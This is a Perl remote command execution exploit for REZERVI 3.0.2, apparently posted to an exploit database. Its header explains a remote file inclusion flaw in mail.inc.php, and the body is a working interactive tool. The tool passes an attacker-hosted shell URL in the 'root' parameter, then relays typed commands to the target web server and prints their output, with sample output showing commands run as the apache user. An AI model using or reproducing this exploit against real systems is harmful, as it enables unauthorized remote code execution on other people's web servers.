#!/usr/bin/perl
####################################################################
#	1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
#	0     _                   __           __       __                     1
#	1   /' \            __  /'__`\        /\ \__  /'__`\                   0
#	0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
#	1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
#	0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
#	1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
#	0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
#	1                  \ \____/ >> Exploit database separated by exploit   0
#	0                   \/___/          type (local, remote, DoS, etc.)    1
#	1                                                                      1
#	0  [+] Site            : Inj3ct0r.com                                  0
#	1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
#	0                                                                      0
#	1                    ########################################          1
#	0                    I'm eidelweiss member from Inj3ct0r Team          1
#	1                    ########################################          0
#	0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
#
# RFI Vulnerability! : [PATH/rezervi/include/mail.inc.php]
#
#		require_once($root."/include/phpmailer/phpmailer.inc.php");
#
# Because $root is not specific here , so we got RFI vulnerability and we can exploit with RCE
#
####################################################################
#
# REZERVI 3.0.2 Remote Command Execution Exploit
# download: http://www.rezervi.com/downloads/rezervi3_0_2.zip
#
# Author: Randy Arios a.k.a eidelweiss
# mail: eidelweiss[at]cyberservices[dot]com
# blog: http://eidelweiss-advisories.blogspot.com
# Greetz: Inj3ct0r Team - YOGYACARDERLINK - devilzc0de - JosS [hack0wn] - exploit-db team
#
# INDONESIAN HACKER still R0CK!!
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
# #####################################################################
# Credit:
# Original Reference (by Jose Luis Gongora Fernandez 'aka' JosS):
# http://www.exploit-db.com/exploits/11624
#
####################################################################
# OUTPUT: (tested on localhost)
#
# [shell]:~$ id
#  uid=80(apache) gid=80(apache) groups=80(apache)
# [shell]:~$ uname -a
#  Linux localhost 2.6.29-grsec #2 SMP Fri Aug 14 21:37:03 PDT 2009 i686 GNU/Linux
# [shell]:~$ exit
# localhost:/home/eidelweiss/Desktop#


use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&clear();

sub banner {
        &clear();
	print "[x] REZERVI 3.0.2 Remote Command Execution Exploit\n";
	print "[x] Written By eidelweiss\n";
	print "[x] eidelweiss[at]cyberservices[dot]com\n\n";
	print "[+] Usage:\n";
	print "[+]     $0 -vuln \"web+path\" -shell \"shell\"\n";
	print "[+] eX: $0 -vuln \"http://localhost/PATH/\" -shell \"http://yourweb/inj3ct0r/sh3ll.txt?\"\n\n";
        exit();
}

my $options = GetOptions (
  'help!'            => \$help,
  'vuln=s'            => \$vuln,
  'shell=s'            => \$shell
  );

&banner unless ($vuln);
&banner unless ($shell);

&banner if $banner eq 1;

chomp($vuln);
chomp($shell);

while (){

	print "[shell]:~\$ ";
	chomp($cmd=<STDIN>);

	if ($cmd eq "exit" || $cmd eq "quit") {
		exit 0;
	}

	my $ua = LWP::UserAgent->new;
        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
        chomp($iny);
        my $own = $vuln . "/rezervi/include/mail.inc.php?root=" . $shell . $iny;
        chomp($own);
	my $req = HTTP::Request->new(GET => $own);
	my $res = $ua->request($req);
	my $con = $res->content;
	if ($res->is_success){
		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
	}
           else
             {
                print "[p0c] Exploit failed\n";
                exit(1);
             }
}

# __E0F__